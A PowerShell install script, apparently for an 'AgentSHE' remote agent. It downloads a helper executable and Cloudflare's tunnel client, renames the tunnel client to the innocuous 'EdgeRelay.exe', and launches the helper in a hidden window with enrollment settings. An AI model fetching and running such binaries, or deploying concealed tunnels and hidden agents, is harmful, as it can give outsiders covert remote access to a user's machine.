$ErrorActionPreference = 'Stop'
if (-not $Enroll) { $Enroll = $env:AGENTSHE_ENROLL }
if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
if (-not $Enroll) { throw 'Enroll manquant' }
if (-not $BotBase) { throw 'BotBase manquant' }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.2' }
$BotBase = $BotBase.TrimEnd('/')
$Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
$Cache = Join-Path $env:TEMP 'HelperHostCache'
New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

function Download-File([string]$Url, [string]$OutFile) {
  if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    & curl.exe -fsSL $Url -o $OutFile
    if ($LASTEXITCODE -ne 0) { throw "download failed: $Url" }
    return
  }
  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $OutFile
}

function Restore-OrFetch([string]$Name, [string]$Url) {
  $dest = Join-Path $Dir $Name
  $cached = Join-Path $Cache $Name
  if (Test-Path $dest) { Copy-Item $dest $cached -Force -ErrorAction SilentlyContinue; return }
  if (Test-Path $cached) { Copy-Item $cached $dest -Force; return }
  $part = Join-Path $Cache ($Name + '.download')
  Write-Host ("prep " + $Name + "…")
  Download-File $Url $part
  Copy-Item $part $cached -Force
  Copy-Item $cached $dest -Force
}

Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'

@{ enroll = $Enroll; bot_base = $BotBase } | ConvertTo-Json | Set-Content -Encoding UTF8 (Join-Path $Dir 'config.json')
$env:AGENTSHE_ENROLL = $Enroll
$env:AGENTSHE_BOT_BASE = $BotBase
$Helper = Join-Path $Dir 'HelperHost.exe'
$tokenFile = Join-Path $Dir 'token'
$agentLog = Join-Path $Dir 'agent.log'
Remove-Item $tokenFile,$agentLog -Force -ErrorAction SilentlyContinue
Start-Process -WindowStyle Hidden -FilePath $Helper -WorkingDirectory $Dir
$ok = $false
for ($i=0; $i -lt 180; $i++) {
  Start-Sleep -Seconds 1
  if (Test-Path $agentLog) {
    $txt = Get-Content $agentLog -Raw -ErrorAction SilentlyContinue
    if ($txt -match 'FAIL') { Write-Output $txt; throw 'install failed' }
  }
  if ((Test-Path $tokenFile) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
    Write-Host 'OK'
    Write-Host 'agent=online'
    Write-Host 'autostart=ok'
    Write-Host 'reboot=auto'
    Write-Host 'watchdog=on'
    Write-Host 'proc_agent=HelperHost.exe'
    Write-Host 'proc_tunnel=EdgeRelay.exe'
    Write-Host 'deps=none'
    $ok = $true
    break
  }
}
if (-not $ok) { throw 'timeout' }
